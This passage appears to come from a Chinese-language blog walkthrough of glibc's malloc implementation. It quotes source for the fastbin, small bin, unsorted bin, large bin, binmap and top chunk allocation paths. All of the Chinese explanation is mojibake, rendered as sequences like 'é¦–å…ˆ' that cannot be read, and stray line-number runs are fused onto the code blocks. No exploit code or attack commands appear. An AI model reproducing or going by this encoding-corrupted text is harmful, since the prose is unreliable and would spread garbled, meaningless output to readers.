chunk2mem (victim); alloc_perturb (p, bytes); return p; } }//ä¸€äº›å…¶ä»–çš„å®/* Atomically store NEWVAL in *MEM if *MEM is equal to OLDVAL. Return the old *MEM value. */#if !defined atomic_compare_and_exchange_val_acq \\ &amp;&amp; defined __arch_compare_and_exchange_val_32_acq# define atomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ __atomic_val_bysize (__arch_compare_and_exchange_val,acq, \\ mem, newval, oldval)#endif#ifndef catomic_compare_and_exchange_val_acq# ifdef __arch_c_compare_and_exchange_val_32_acq# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ __atomic_val_bysize (__arch_c_compare_and_exchange_val,acq, \\ mem, newval, oldval)# else# define catomic_compare_and_exchange_val_acq(mem, newval, oldval) \\ atomic_compare_and_exchange_val_acq (mem, newval, oldval)# endif#endif//å±•å¼€ä¹‹å#define __atomic_val_bysize(pre, post, mem, ...) \\ ({ \\ __typeof (*mem) __atg1_result; \\ if (sizeof (*mem) == 1) \\ __atg1_result = pre##_8_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 2) \\ __atg1_result = pre##_16_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 4) \\ __atg1_result = pre##_32_##post (mem, __VA_ARGS__); \\ else if (sizeof (*mem) == 8) \\ __atg1_result = pre##_64_##post (mem, __VA_ARGS__); \\ else \\ abort (); \\ __atg1_result; \\ }) â€‹ é¦–å…ˆæ ¹æ®åˆ†é…å¤§å°ï¼Œè·å–è¯¥chunkæ‰€å±çš„fastbinçš„indexï¼Œç„¶åæ ¹æ®indexè·å–æ‰€éœ€è¦çš„fastbinçš„ç©ºé—²é“¾è¡¨çš„å¤´æŒ‡é’ˆï¼›ç„¶åå°†å¤´æŒ‡é’ˆçš„ä¸‹ä¸€ä¸ªchunk ä½œä¸ºç©ºé—²chunk é“¾è¡¨çš„å¤´éƒ¨ã€‚åé¢checkä¹‹åï¼Œç›´æ¥ä½¿ç”¨chunk2mem()æŠŠç”¨æˆ·æ‰€éœ€çš„å†…å­˜å—è½¬æ¢å¹¶ä¸”è¿”å›ã€‚ 3.small bin12345678910111213141516171819202122232425262728293031323334353637383940 /* If a small request, check regular bin. Since these &quot;smallbins&quot; hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if (in_smallbin_range (nb)) { idx = smallbin_index (nb); bin = bin_at (av, idx); if ((victim = last (bin)) != bin)//ä¸è¡¨å¤´ç›¸åŒï¼Œè¯´æ˜é“¾è¡¨æ˜¯ç©ºçš„ï¼›ä¸ç›¸åŒçš„è¯è¿›å…¥ä¸‹é¢çš„é€»è¾‘ { if (victim == 0) /* initialization check */ malloc_consolidate (av); //åˆå¹¶fastbin else { //å°†victimä»åŒå‘å¾ªç¯é“¾è¡¨ä¸­å–å‡ºæ¥ bck = victim-&gt;bk;if (__glibc_unlikely (bck-&gt;fd != victim)) { errstr = &quot;malloc(): smallbin double linked list corrupted&quot;; goto errout; } //è®¾ç½®inuseæ ‡å¿—ã€‚ set_inuse_bit_at_offset (victim, nb); bin-&gt;bk = bck; bck-&gt;fd = bin; if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } } â€‹ é¦–å…ˆè¿˜æ˜¯æ ¹æ®åˆ†é…çš„å¤§å°ï¼Œæ‰¾åˆ°æ‰€å¯¹åº”çš„small binçš„indexï¼Œç„¶åæ ¹æ®è¿™ä¸ªindexå»æ‰¾åˆ°æ‰€éœ€çš„small binçš„ç©ºé—²é“¾è¡¨å¤´æŒ‡é’ˆï¼›ç„¶åå°†æœ€åä¸€ä¸ªchunkèµ‹å€¼ç»™victimï¼Œç„¶ååšåˆ¤æ–­ï¼Œå¦‚æœå’Œè¡¨å¤´ç›¸åŒï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªé“¾è¡¨å½“å‰æ˜¯ç©ºçš„ï¼Œå°±ä¸èƒ½ä»è¿™ä¸ªsmall binä¸­åˆ†é…å†…å­˜ï¼Œè¿™å°±è¦èµ°åé¢çš„æµç¨‹äº†ï¼›å¦‚æœä¸åŒï¼Œè¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼š victimä¸º0ï¼Œå³è¿˜æ²¡æœ‰åˆå§‹åŒ–åŒå‘å¾ªç¯é“¾è¡¨ï¼Œè¿™æ—¶å€™å°±è¦å»åˆå¹¶fast binï¼› victimä¸ä¸º0ï¼Œç›´æ¥æŠŠvictimä»small binä¸­å–å‡ºæ¥ï¼Œè®¾ç½®æ ‡å¿—ä½ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å±äºä¸»åˆ†é…åŒºï¼Œä¹‹åè°ƒç”¨chunk2meme()è½¬æ¢æˆç”¨æˆ·æ‰€éœ€å†…å­˜ç©ºé—´å¹¶è¿”å›ã€‚ 4.large bin123456789101112131415161718/* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */else { idx = largebin_index (nb); if (have_fastchunks (av)) //åˆå¹¶fastbinä¸­çš„chunkï¼ŒåŠ å…¥unsorted bin malloc_consolidate (av); } â€‹ åœ¨åˆ†é…ä¹‹å‰ä¼šå…ˆåˆå¹¶fast binä¸­çš„chunkï¼ŒåŠ å…¥unsorted binã€‚ â€‹ ä¸‹é¢ä»£ç æ˜¯éå†unsorted binä¸­çš„ç©ºé—²å—ï¼ŒåŠ å…¥åˆ°ç›¸åº”çš„small bin æˆ–è€…large binä¹‹ä¸­ï¼Œä»£ç æ¯”è¾ƒé•¿ï¼Œæ‰€ä»¥ä¸€éƒ¨åˆ†ä¸€éƒ¨åˆ†çš„çœ‹ã€‚ 123456789101112131415161718192021222324/* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a &quot;small&quot; request. */for (;; ) { int iters = 0; while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) { bck = victim-&gt;bk; if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0)) malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;, chunk2mem (victim), av); size = chunksize (victim); è¿™é‡Œå…ˆæ˜¯åå‘éå†é“¾è¡¨ï¼Œæ£€æŸ¥sizeï¼Œè¦å°äºç­‰äº 2*SIZE_SZï¼Œå¹¶ä¸”ä¸èƒ½å¤§äºç³»ç»Ÿåˆ†é…çš„æ€»é‡ã€‚ç„¶åè·å–chunkçš„sizeã€‚ 123456789101112131415161718192021222324252627282930313233343536/* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ if (in_smallbin_range (nb) &amp;&amp; bck == unsorted_chunks (av) &amp;&amp; victim == av-&gt;last_remainder &amp;&amp; (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) { /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; av-&gt;last_remainder = remainder; remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); //large chunk if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } â€‹ ä¹‹å‰çš„small bin æ²¡æœ‰æˆåŠŸåˆ†é…ï¼Œå¹¶ä¸”åªæœ‰ä¸€ä¸ªchunkçš„æ—¶å€™ï¼Œé‚£ä¸ªchunkå°±æ˜¯last remainder chunkï¼Œä¸”last remainder chunk çš„sizeå¤§äºæ‰€éœ€è¦çš„å¤§å°+MINSIZEï¼Œè¿™ä¸ªæ—¶å€™å°±å¯å·²ä»è¿™ä¸ªå—ä¸­å»åˆ†é…æ‰€éœ€è¦çš„å†…å­˜ã€‚ â€‹ åé¢å°±æ˜¯ä»è¿™ä¸ªchunk ä¸­åˆ‡åˆ†å‡ºæ‰€éœ€å¤§å°çš„chunkï¼Œè®¡ç®—åˆ‡åˆ†åå‰©ä¸‹chunk çš„å¤§å°ï¼Œå°†å‰©ä¸‹çš„chunkåŠ å…¥unsorted bin çš„é“¾è¡¨ä¸­ï¼Œå¹¶å°†å‰©ä¸‹çš„chunk ä½œä¸ºåˆ†é…åŒºçš„last remainder chunkï¼Œè‹¥å‰©ä¸‹çš„chunk å±äºlarge bin chunkï¼Œå°†è¯¥chunk çš„fd_nextsize å’Œbk_nextsize è®¾ç½®ä¸ºNULLã€‚ â€‹ ç„¶åè®¾ç½®ä¸€äº›æ ‡å¿—ä½ï¼Œå¯¹äºlast remainder chunkéœ€è¦è°ƒç”¨set_foot()ï¼Œå› ä¸ºå¤„äºç©ºé—²çŠ¶æ€çš„chunkçš„pre_sizeæ‰æ˜¯æœ‰æ•ˆçš„ï¼›ä¹‹åå°±æ˜¯åˆ©ç”¨chunk2mem()è½¬æ¢ï¼Œç„¶åè¿”å›ç»™ç”¨æˆ·äº†ã€‚ 123/* remove from unsorted list */unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av); â€‹ å°†åŒå‘å¾ªç¯é“¾è¡¨ä¸­çš„æœ€åä¸€ä¸ªchunk ç§»é™¤ 12345678910111213/* Take now instead of binning if exact fit */if (size == nb) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } â€‹ å¦‚æœå½“å‰éå†çš„chunkçš„sizeæ­£å¥½å’Œéœ€è¦çš„åˆ†é…çš„å¤§å°nbç›¸ç­‰ï¼Œé‚£ç›´æ¥å°±è¿”å›å½“å‰å—ï¼šè®¾ç½®inuseæ ‡å¿—ä½ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦å±äºä¸»åˆ†é…åŒºï¼Œå¹¶è®¾ç½®ç›¸åº”çš„æ ‡å¿—ä½ï¼Œä¹‹åè°ƒç”¨chunk2mem()è½¬æ¢åå°±è¿”å›ç»™ç”¨æˆ·äº†ã€‚ 12345678/* place chunk in bin */ if (in_smallbin_range (size)) { victim_index = smallbin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; } åˆ¤æ–­å½“å‰éå†çš„chunkæ˜¯å¦åœ¨small binçš„èŒƒå›´ï¼Œåœ¨çš„è¯æ’å…¥åˆ°small binçš„è¡¨å¤´ï¼Œæˆä¸ºç¬¬ä¸€ä¸ªå—ã€‚ ä¸åœ¨small binçš„èŒƒå›´çš„è¯ï¼Œå°±æ˜¯large binäº†ï¼Œå°±èµ°ä¸‹é¢çš„é€»è¾‘ï¼š 123456 else { victim_index = largebin_index (size); bck = bin_at (av, victim_index); fwd = bck-&gt;fd; ç±»ä¼¼ä¸Šé¢çš„ï¼ŒæŠŠå½“å‰éå†çš„è¿™ä¸ªchunkæ’å…¥åˆ°large binçš„è¡¨å¤´æˆä¸ºlarge binçš„ç¬¬ä¸€ä¸ªå—ã€‚ 12345678910111213141516/* maintain large bins in sorted order */ if (fwd != bck) { /* Or with inuse bit to speed comparisons */ size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0); if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) { fwd = bck; bck = bck-&gt;bk; victim-&gt;fd_nextsize = fwd-&gt;fd; victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } if (fwd != bck)æ„å‘³ç€å½“å‰é“¾è¡¨ä¸ä¸ºç©ºï¼Œéœ€è¦æŠŠå½“å‰çš„å—æ’å…¥large binçš„é“¾è¡¨ä¸­ï¼Œè®¾ç½®inuseæ ‡å¿—ï¼Œå¹¶ä¸”æ’å…¥åˆ°é€‚åˆçš„ä½ç½®ã€‚ 12345678else { assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); while ((unsigned long) size &lt; fwd-&gt;size) { fwd = fwd-&gt;fd_nextsize; assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0); } å¦‚æœsizeæ¯”æœ€åä¸€ä¸ªchunkçš„sizè¿˜è¦å°ï¼Œé‚£å°±ç›´æ¥æ’å…¥åˆ°æœ€åã€‚ 123456789101112if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* Always insert in the second position. */ fwd = fwd-&gt;fd; else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; æ­£å‘éå†chunk sizeé“¾è¡¨ï¼Œæ‰¾åˆ°ä¸€ä¸ªå’Œå½“å‰chunkå¤§å°ç›¸åŒçš„chunkå°±é€€å‡ºï¼Œé‚£ä¹ˆchunk size é“¾è¡¨ä¸­ä¸€å®šåŒ…å«fwd æ‰€æŒ‡å‘çš„chunkï¼Œä¸ºäº†ä¸ä¿®æ”¹chunk size é“¾è¡¨ï¼Œå½“å‰chunk åªèƒ½æ’å…¥fwd ä¹‹åã€‚ 12345 } } else victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;} å¦‚æœlarge biné“¾è¡¨é‡Œæ²¡æœ‰chunkï¼Œé‚£ä¹ˆå°±ç›´æ¥æ’å…¥chunk sizeé“¾è¡¨ã€‚ 12345mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; å®Œæˆchunkçš„æ’å…¥ç©ºé—²é“¾è¡¨ä¹‹åï¼Œè®¾ç½®bitmapã€‚ 1234#define MAX_ITERS 10000 if (++iters &gt;= MAX_ITERS) break; } è¿™é‡Œè®¾ç½®äº†æœ€å¤§çš„è¿­ä»£æ¬¡æ•°ï¼Œè¶…å‡ºå°±ç›´æ¥é€€å‡ºäº†ã€‚ â€‹ å½“å°†unsorted bin ä¸­çš„ç©ºé—²chunk åŠ å…¥åˆ°ç›¸åº”çš„small bins å’Œlarge bins åï¼Œå°†ä½¿ç”¨æœ€ä½³åŒ¹é…æ³•åˆ†é…large bin chunkã€‚æºä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617/* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */if (!in_smallbin_range (nb)) { bin = bin_at (av, idx); /* skip scan if empty or largest chunk is too small */ if ((victim = first (bin)) != bin &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) { victim = victim-&gt;bk_nextsize; while (((unsigned long) (size = chunksize (victim)) &lt; (unsigned long) (nb))) victim = victim-&gt;bk_nextsize; â€‹ å¦‚æœæ‰€åˆ†é…çš„å—æ˜¯large bin chunkï¼Œé‚£ä¹ˆè¿›å…¥è¿™æ®µé€»è¾‘ï¼Œå½“large bin listä¸ä¸ºç©ºä¸”æœ€å¤§çš„chunkå¯ä»¥æ»¡è¶³éœ€è¦ï¼Œå°±åå‘éå†é“¾è¡¨ï¼Œæ‰¾åˆ°å¤§å°æœ€åˆé€‚çš„chunkï¼Œç„¶åé€€å‡ºå¾ªç¯ã€‚ 1234567/* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) victim = victim-&gt;fd; remainder_size = size - nb; unlink (av, victim, bck, fwd); â€‹ å¦‚æœæ‰€é€‰çš„chunk(å³victim)ä¸æ˜¯æœ€åä¸€ä¸ªchunkï¼Œä¸”ä¸‹ä¸€ä¸ªå—chunkå¤§å°å’Œæ‰€é€‰çš„chunkå¤§å°ä¸€è‡´ï¼Œé‚£ä¹ˆæŠŠåé¢çš„é‚£ä¸ªchunkä½œä¸ºå¤‡é€‰ã€‚ â€‹ è®¡ç®—victimåˆ†å‰²åå‰©ä½™çš„sizeï¼Œç„¶åä½¿ç”¨unlink()å®å»æŠŠvictimä»é“¾è¡¨ä¸­å–å‡ºæ¥ã€‚ 1234567/* Exhaust */ if (remainder_size &lt; MINSIZE) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; } â€‹ ä¹‹ååˆ¤æ–­åˆ†å‰²åå‰©ä½™å¤§å°ï¼Œå¦‚æœå°äºMINSIZE(åˆ†é…çš„chunkè¦ç•¥å¤§äºéœ€è¦çš„chunk)ï¼Œé‚£ä¹ˆå°±ç»™victimè®¾ç½®inuseæ ‡å¿—ï¼Œç„¶åæ ¹æ®æ˜¯å¦æ˜¯ä¸»åˆ†é…åŒºçš„åˆ¤æ–­ï¼Œè®¾ç½®ç›¸åº”çš„æ ‡å¿—ä½ã€‚ 12345678910111213141516171819202122232425262728293031323334 /* Split */ else { remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd;if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;malloc(): corrupted unsorted chunks&quot;; goto errout; } remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } â€‹ ä»victimä¸­åˆ†å‰²å‡ºå»çš„å‰©ä½™éƒ¨åˆ†ä½œä¸ºæ–°chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œæ¥ç€æ˜¯åˆ¤æ–­å¤§å°ï¼Œå¦‚æœæ˜¯large binçš„èŒƒå›´ï¼Œè¿˜è¦æŠŠfd_nextsizeå’Œbk_nextsizeç½®ä¸ºNULLï¼Œä¹‹åè®¾ç½®æ ‡å¿—ä½ï¼Œå› ä¸ºremainderç©ºé—²ï¼Œæ‰€ä»¥è¿˜è¦è®¾ç½®foot(ä¸Šé¢çš„åˆ†æé‡Œä¹Ÿæœ‰ç±»ä¼¼è¿™æ®µè®¾ç½®æ ‡å¿—ä½çš„é€»è¾‘)ã€‚æœ€åå°±å¾ˆç®€å•äº†ï¼Œè°ƒç”¨chunk2mem()çš„åˆ°å¯ç”¨çš„å†…å­˜æŒ‡é’ˆå¹¶è¿”å›ç»™ç”¨æˆ·ã€‚ â€‹ ä¸Šé¢ä»æœ€åˆé€‚çš„small binå’Œlarge binéƒ½æ²¡æœ‰åˆé€‚çš„chunkå»åˆ†é…ï¼Œé‚£ä¹ˆå°±ä¼šæŸ¥çœ‹æ¯”å½“å‰indexå¤§çš„ä¸‹ä¸€ä¸ªsmall bin æˆ–è€…large binä¸­æœ‰æ²¡æœ‰åˆé€‚çš„å—å»åˆ†é…ç»™ç”¨æˆ·ï¼Œæºç å¦‚ä¸‹ 12345678910111213141516/* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; bin = bin_at (av, idx); block = idx2block (idx); map = av-&gt;binmap[block]; bit = idx2bit (idx); â€‹ é¦–å…ˆè·å–ä¸‹ä¸€ä¸ªbinï¼Œä¸‹é¢æ˜¯malloc_stateçš„ç»“æ„ä½“ï¼Œbitmapæ˜¯æ ‡è¯†å¯¹åº”çš„binä¸­æœ‰æ²¡æœ‰ç©ºé—²chunkã€‚bitmapæ˜¯æŒ‰ç…§blockç®¡ç†çš„ï¼Œæ‰€ä»¥å…ˆè·å–äº†blockï¼Œç„¶åæ ¹æ®è·å–åˆ°çš„blockå»è·å–bitmapã€‚ 123456789101112131415161718192021222324252627282930313233343536373839struct malloc_state{ /* Serialize access. */ mutex_t mutex; /* Flags (formerly in max_fast). */ int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; //point to the TOP CHUNK of malloc state -- by muhe /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;}; â€‹ bité€šè¿‡ä¸‹é¢çš„å®è¢«è®¾ç½®ï¼ŒidxæŒ‡å®šçš„ä½ç½®ä¸º1ï¼Œå…¶ä»–ä½ä¸º0 ã€‚ 1#define idx2bit(i) ((1U &lt;&lt; ((i) &amp; ((1U &lt;&lt; BINMAPSHIFT) - 1)))) â€‹ å¦‚æœbitå¤§äºmapï¼Œåˆ™mapä¸º0ï¼Œmapä¸º0ï¼Œè¯´æ˜å½“å‰binä¸­æ²¡æœ‰ç©ºé—²chunkï¼Œæ‰€ä»¥å»éå†bitmapçš„ä¸‹ä¸€ä¸ªblockï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªä¸ä¸º0ï¼Œæˆ–è€…éå†å®Œæ‰ç»“æŸã€‚ â€‹ åœ¨é€€å‡ºå¾ªç¯éå†åï¼Œè®¾ç½®bin æŒ‡å‘block çš„ç¬¬ä¸€ä¸ªbit å¯¹åº”çš„binï¼Œå¹¶å°†bit ä¸º1ï¼Œ è¡¨ç¤ºè¯¥blockä¸­bit 1 å¯¹åº”çš„binï¼Œè¿™ä¸ªbin ä¸­å¦‚æœæœ‰ç©ºé—²chunkï¼Œè¯¥chunk çš„å¤§å°ä¸€å®šæ»¡è¶³è¦æ±‚ã€‚ 1#define BINMAPSHIFT 5 123456789101112131415for (;; ) { /* Skip rest of block if there are no more set bits in this block. */ if (bit &gt; map || bit == 0) { do { if (++block &gt;= BINMAPSIZE) /* out of bins */ goto use_top; //èµ°top chunkçš„é€»è¾‘ } while ((map = av-&gt;binmap[block]) == 0); //å–åˆ°ä¸‹ä¸€ä¸ªblockçš„map bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT)); bit = 1; } â€‹ è¿™æ®µé€»è¾‘ï¼Œæ˜¯éå†ä¸€ä¸ªblocké‡Œæ‰€æœ‰çš„binï¼Œå› ä¸ºmapæ˜¯é0çš„ï¼Œæ‰€ä»¥æ‰¾åˆ°bitä¸ä¸º0å°±é€€å‡ºå¾ªç¯ï¼Œé‚£ä¹ˆè¿™ä¸ªbitå¯¹åº”binä¸­ä¸€å®šæœ‰ç©ºé—²chunkã€‚ 12345678/* Advance to bin with set bit. There must be one. */ while ((bit &amp; map) == 0) { bin = next_bin (bin); bit &lt;&lt;= 1; assert (bit != 0); } â€‹ è·å–è¿™ä¸ªbinçš„æœ€åä¸€ä¸ªchunkå³victimï¼Œå¦‚æœæœ€åä¸€ä¸ªchunkå’Œé“¾è¡¨å¤´æŒ‡é’ˆç›¸åŒï¼Œé‚£ä¹ˆè¯´æ˜è¿™ä¸ªé“¾è¡¨ä¸­æ²¡æœ‰ç©ºchunkï¼Œè¿™ä¸ªæ—¶å€™å°±å…ˆæŠŠä¹‹å‰bitæ¸…é›¶ï¼Œç„¶ååˆ°ä¸‹ä¸€ä¸ªbinä¸­ï¼Œ 12345678910/* Inspect the bin. It is likely to be non-empty */ victim = last (bin); /* If a false alarm (empty bin), clear the bit. */ if (victim == bin) { av-&gt;binmap[block] = map &amp;= ~bit; /* Write through */ bin = next_bin (bin); bit &lt;&lt;= 1; } â€‹ å¦‚æœä¸ç›¸åŒï¼Œé‚£ä¹ˆå…ˆçš„åˆ°victimçš„sizeï¼Œç„¶åå’Œä¹‹å‰çš„é€»è¾‘ç±»ä¼¼ï¼Œè®¡ç®—åˆ†å‰²åçš„å¤§å°remainder_sizeï¼Œç„¶åä½¿ç”¨unlinkå®å»æŠŠvictimä»é“¾è¡¨ä¸­è§£é“¾å‡ºæ¥ã€‚ 1234567891011else { size = chunksize (victim); /* We know the first chunk in this bin is big enough to use. */ assert ((unsigned long) (size) &gt;= (unsigned long) (nb)); remainder_size = size - nb; /* unlink */ unlink (av, victim, bck, fwd); â€‹ è¿™é‡Œåˆ¤æ–­åˆ‡å‰²åçš„å¤§å°å¹¶é’ˆå¯¹ä¸åŒçš„å¤§å°åšä¸åŒçš„å¤„ç†ã€‚ å¦‚æœåˆ‡å‰²å‰©ä½™å¤§å°æ¯”MINSIZEå°ï¼Œé‚£ä¹ˆå°±åº”è¯¥æŠŠæ•´ä¸ªchunkåˆ†ç»™ç”¨æˆ·ï¼Œä¹‹åå°±è®¾ç½®å¯¹åº”çš„æ ‡å¿—ä½ï¼Œä¹‹åå°±æ˜¯è¿”å›çš„å·¥ä½œäº†ï¼› å¦‚æœæ¯”MINSIZEå¤§ï¼Œå°±è¦åˆ†å‰²äº†ã€‚åˆ†å‰²å‰©ä¸‹çš„è¿™å—ï¼Œè¦ä½œä¸ºæ–°çš„chunkåŠ å…¥unsorted binã€‚ 123456789101112131415161718192021222324252627/* Exhaust */ if (remainder_size &lt; MINSIZE) { set_inuse_bit_at_offset (victim, size); if (av != &amp;main_arena) victim-&gt;size |= NON_MAIN_ARENA; } /* Split */ else { remainder = chunk_at_offset (victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ bck = unsorted_chunks (av); fwd = bck-&gt;fd;if (__glibc_unlikely (fwd-&gt;bk != bck)) { errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;; goto errout; } //æ·»åŠ åˆ°ç¬¬ä¸€ä¸ªä½ç½® remainder-&gt;bk = bck; remainder-&gt;fd = fwd; bck-&gt;fd = remainder; fwd-&gt;bk = remainder; â€‹ å¦‚æœæ•´ä¸ªå‰©ä½™çš„chunkæ˜¯small binï¼Œé‚£ä¹ˆå°±è¦æŠŠåˆ†é…åŒºçš„last remainder è®¾ç½®ä¸ºè¿™ä¸ªchunkï¼›å¦‚æœæ˜¯large binï¼Œè¦æŠŠfd_nextsizeå’Œbk_nextsizeç½®NULLï¼Œç„¶åå’Œä¹‹å‰å¯¹large binå¤„ç†çš„é€»è¾‘ä¸€æ ·ï¼Œè®¾ç½®headã€footçš„æ ‡å¿—ä½ã€‚ 1234567891011121314/* advertise as last remainder */ if (in_smallbin_range (nb)) av-&gt;last_remainder = remainder; if (!in_smallbin_range (remainder_size)) { remainder-&gt;fd_nextsize = NULL; remainder-&gt;bk_nextsize = NULL; } set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); set_foot (remainder, remainder_size); } â€‹ æœ€åé€»è¾‘å¾ˆç®€å•ï¼Œè°ƒç”¨chunk2memçš„åˆ°å¯ç”¨çš„å†…å­˜æŒ‡é’ˆï¼Œå¹¶è¿”å›ç»™ç”¨æˆ·ã€‚ 123456check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } } 5.top chunkâ€‹ è¿™éƒ¨åˆ†æ˜¯åœ¨å‰é¢æ‰€æœ‰åˆ†é…éƒ½å¤±è´¥çš„æƒ…å†µä¸‹æ‰ä¼šåˆ°çš„é€»è¾‘ï¼Œå³fastbin ã€small binã€large bin éƒ½æ²¡æœ‰åˆ†é…åˆ°æ‰€éœ€è¦çš„chunkï¼Œå°±ä¼šä»å½“å‰åˆ†é…å®ä¾‹çš„top chunkç›´æ¥åˆ†é…å†…å­˜ï¼Œä»£ç å¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334use_top: /* If large enough, split off the chunk bordering the end of memory (held in av-&gt;top). Note that this is in accord with the best-fit search rule. In effect, av-&gt;top is treated as larger (and thus less well fitting) than any other available chunk since it can be extended to be as large as necessary (up to system limitations). We require that av-&gt;top always exists (i.e., has size &gt;= MINSIZE) after initialization, so if it would otherwise be exhausted by current request, it is replenished. (The main reason for ensuring it exists is that we may need MINSIZE space to put in fenceposts in sysmalloc.) */ victim = av-&gt;top; size = chunksize (victim); if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-&gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, 